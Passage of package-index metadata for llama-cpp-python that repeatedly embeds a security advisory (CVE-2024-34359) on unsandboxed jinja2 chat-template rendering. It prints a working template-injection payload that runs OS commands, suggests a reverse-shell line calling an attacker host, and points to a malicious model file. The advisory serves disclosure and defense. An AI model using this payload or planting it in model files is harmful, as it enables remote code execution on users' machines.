).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.67":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.67/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.67","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"e2c1df80fbbaa2f91928b61336bac48057837d2ec36e30ce704cfe96d784cd55","md5":"aabfa4b915c142a622ac5a32c7872f20","sha256":"29e64afbe86ea19fb9ed681f79215c1029bc229017dd278cef93e96de904cfb9"},"downloads":-1,"filename":"llama_cpp_python-0.2.67.tar.gz","has_sig":false,"md5_digest":"aabfa4b915c142a622ac5a32c7872f20","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":42442943,"upload_time":"2024-04-30T07:13:16","upload_time_iso_8601":"2024-04-30T07:13:16.790160Z","url":"https://files.pythonhosted.org/packages/e2/c1/df80fbbaa2f91928b61336bac48057837d2ec36e30ce704cfe96d784cd55/llama_cpp_python-0.2.67.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.68":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.68/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.68","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"b90de44b55c3dd60daa566ac7bbc9b21a943926773aac8fad9bbb03b5ba38be0","md5":"225b7de16351beb4f3ca28fe94a97c90","sha256":"737f2136c5f6fa1b0451f600c91ae2abe066edc7515937ca56efa4a648fdc71e"},"downloads":-1,"filename":"llama_cpp_python-0.2.68.tar.gz","has_sig":false,"md5_digest":"225b7de16351beb4f3ca28fe94a97c90","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":42482590,"upload_time":"2024-04-30T13:46:06","upload_time_iso_8601":"2024-04-30T13:46:06.969087Z","url":"https://files.pythonhosted.org/packages/b9/0d/e44b55c3dd60daa566ac7bbc9b21a943926773aac8fad9bbb03b5ba38be0/llama_cpp_python-0.2.68.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch 